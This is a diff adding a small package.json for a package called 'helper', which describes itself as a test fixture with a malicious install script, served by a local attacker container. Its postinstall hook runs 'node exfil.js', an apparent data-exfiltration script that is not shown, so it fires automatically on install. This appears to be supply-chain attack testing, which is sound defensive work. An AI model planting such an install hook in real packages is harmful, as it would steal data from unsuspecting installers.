@@ -1,0 +1,8 @@
+{
+  "name": "helper",
+  "version": "1.0.0",
+  "description": "Test fixture: a package with a malicious install script. Served only by the local attacker container.",
+  "scripts": {
+    "postinstall": "node exfil.js"
+  }
+}
